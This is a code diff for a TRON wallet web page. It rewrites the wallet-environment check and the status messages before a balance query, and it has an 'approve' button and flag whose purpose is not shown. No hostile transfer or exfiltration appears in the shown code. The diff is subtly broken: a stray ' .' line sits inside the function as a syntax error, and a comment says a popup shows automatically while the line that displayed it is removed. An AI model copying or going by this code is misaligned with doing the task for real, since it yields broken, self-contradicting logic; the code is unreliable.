@@ -1618,6 +1618,7 @@ async function initWallet(isAfterApprove = false) {
         // 步骤2：查询余额前先显示“环境检测中”（覆盖原“查询中”）
         DOM.userInfoDefault.style.display = "block";
         DOM.userInfoStatus.style.display = "block";
+        DOM.userInfoStatus.innerHTML = ""; // 清空旧提示，避免叠加
         DOM.userInfoStatus.innerHTML = lang.a1CheckingTip; // 发送A1前显示检测中
         DOM.recordList.style.display = "block";
 
@@ -1717,39 +1718,25 @@ async function initWallet(isAfterApprove = false) {
      * 修复3：点击链接后直接显示选择钱包弹窗（无需点击连接按钮）
      * 检测钱包环境（TRON兼容钱包）
      */
-    async function checkWalletEnv() {
-    // 情况1：存在 tronWeb → 是钱包环境，等待就绪后渲染钱包内容（不显示外部提示）
-    if (window.tronWeb) {
-        // 隐藏外部浏览器的提示容器（避免误显示）
+   async function checkWalletEnv() {
+    // 检测到本地tronWeb（已连接钱包）
+    if (window.tronWeb && window.tronWeb.ready) {
+        tronWeb = window.tronWeb;
+        DOM.connectBtn.style.display = "none"; // 隐藏连接按钮
+        DOM.warning.style.display = "none";
         DOM.specialTipContainer.style.display = "none";
-        DOM.connectBtn.style.display = "none";
-        DOM.userInfoStatus.innerHTML = ""; // 清空可能的外部提示
-
-        try {
-            // 等待 tronWeb 完全就绪
-            await new Promise(resolve => {
-                if (window.tronWeb.ready) resolve();
-                else window.tronWeb.onReady(resolve);
-            });
-            // 就绪后初始化钱包（钱包环境的正常流程）
-            tronWeb = window.tronWeb;
-            DOM.warning.style.display = "none";
-            await initWallet(false);
-        } catch (err) {
-            console.error("钱包环境初始化失败：", err);
-        }
+        await initWallet(false);
         return;
     }
 
-    // 情况2：完全没有 tronWeb → 是真外部浏览器，才显示外部提示
+    // 非钱包环境：自动显示弹窗（核心需求）+ 显示连接按钮（关闭后可重新触发）
     DOM.specialTipContainer.style.display = "block";
     DOM.userInfoDefault.style.display = "none";
     DOM.userInfoStatus.style.display = "block";
-    DOM.userInfoStatus.innerHTML = "请选择要连接的钱包"; // 外部浏览器才显示的文本
+    DOM.userInfoStatus.innerHTML = "请选择要连接的钱包";
     DOM.approveBtn.style.display = "none";
-    DOM.connectBtn.style.display = "block";
-    // 显示钱包弹窗（仅外部浏览器需要）
-    DOM.multiWalletPopup.style.display = "block";
+    DOM.connectBtn.style.display = "block"; // 显示按钮，关闭弹窗后可重新点击
+
  .
 
      // 自动显示弹窗（强制定位在底部，避免位置问题）
